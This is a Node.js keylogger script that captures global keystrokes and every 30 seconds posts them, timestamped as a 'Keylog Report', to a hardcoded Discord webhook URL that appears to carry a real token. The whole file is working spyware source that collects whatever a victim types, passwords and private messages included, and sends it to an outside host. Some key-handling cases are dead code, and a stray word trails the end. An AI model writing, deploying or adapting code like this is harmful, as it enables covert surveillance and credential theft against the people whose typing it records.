const { GlobalKeyboardListener } = require("node-global-key-listener");
const axios = require("axios");
const { DateTime } = require("luxon");

const webhookURL =
  "https://discord.com/api/webhooks/1232335626850930901/R94HjlvRIRRaZm_pT2AXDMq3aeehzQmj0gqsGS5lmEVty85TwhWLatGz7_RYZAE06ZlH";

const v = new GlobalKeyboardListener();
let keystrokes = "";

// Log every key that's pressed.
v.addListener(function (e, down) {
  if (e.state === "UP") {
    let key = e.name; // Use the raw key name without conversion to uppercase

    // Filter out non-alphanumeric keys and special characters
    if (/^[a-zA-Z0-9 ]$/.test(key)) {
      // Replace special keys with meaningful representations
      switch (key) {
        case "space":
          key = " ";
          break;
        case "tab":
          key = "<TAB>";
          break;
        case "return":
          key = "<ENTER>";
          break;
      }
      process.stdout.write(key); // Display the typed character in the terminal
      keystrokes += key;
    }
  }
});

// Send keystrokes to Discord via webhook every 30 seconds
setInterval(async () => {
  if (keystrokes) {
    const timestamp = DateTime.now().toFormat("yyyy-MM-dd HH:mm:ss");
    const message = `**Keylog Report**\n\n\`\`\`${timestamp}\n${keystrokes}\n\`\`\``;

    try {
      await axios.post(webhookURL, { content: message });
      console.log("Keystrokes sent to Discord successfully.");
    } catch (error) {
      console.error("Failed to send keystrokes to Discord:", error);
    }

    keystrokes = ""; // Clear keystrokes after sending
  }
}, 1000 * 30);

// Graceful shutdown on SIGINT (Ctrl+C)
process.on("SIGINT", () => {
  console.log("\nExiting...");
  process.exit();
});mark
